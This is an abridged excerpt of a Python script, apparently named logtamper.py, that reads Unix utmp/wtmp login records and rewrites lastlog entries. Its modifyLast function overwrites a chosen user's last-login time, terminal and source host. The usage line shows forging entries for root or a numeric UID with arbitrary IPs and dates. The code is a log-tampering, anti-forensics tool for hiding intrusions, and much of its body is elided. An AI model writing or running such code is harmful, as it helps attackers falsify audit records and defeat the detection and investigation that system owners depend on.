...
def getXtmp(filename, username, hostname):
    ...
    try:
        ...
        errexit('Cannot open file:', filename)
    finally:
        fp.close()
    return xtmp
    ...
    try:
        ...
        with open(filename, 'rb') as fp:
            ...
            while i+siz <= len(buf):
                ...
                #print(111,filename, data)
                t,tty,ipa = (data[0], data[1].strip(b'\x00'), data[2].strip(b'\x00'))
                print(filename, i/siz-1, t,tty,ipa)
    except Exception as e:
        errexit('echo', filename, e)
    finally:
        pass #fp.close()
...
def modifyLast(filename, pw_uid, hostname, ttyname, strtime):
    ...
    echo(filename, LAST_STRUCT) ; print()
    ...
    try:
        data = struct.pack(LAST_STRUCT, timestamp, ttyname.encode(), hostname.encode())
        with open(filename, 'rb') as fp:
            buf = fp.read()
            if len(buf) < LAST_STRUCT_SIZE * pw_uid + len(data):
                errexit("len-of-file", len(buf), pw_uid)
            #buf = list(buf)
            px = LAST_STRUCT_SIZE * pw_uid 
            buf = b''.join((buf[:px], data, buf[px+len(data):]))
        with open(filename, 'wb') as fp:
            #fp.seek(LAST_STRUCT_SIZE * pw_uid)
            fp.write(buf) #(''.join(buf))
    except Exception as ex:
        errexit('modifyLast: %s' % filename, ex)
    finally:
        pass
    echo(filename, LAST_STRUCT) ; print()
    return True
...
if __name__ == '__main__':
    usage = 'usage: logtamper.py -m 2 -u root -i 192.168.0.188\n \
        logtamper.py -f lastlog -m 3 -u 1000 -i 192.168.2.18 -d 2018:03:26:15:11:12 -t pts/3'
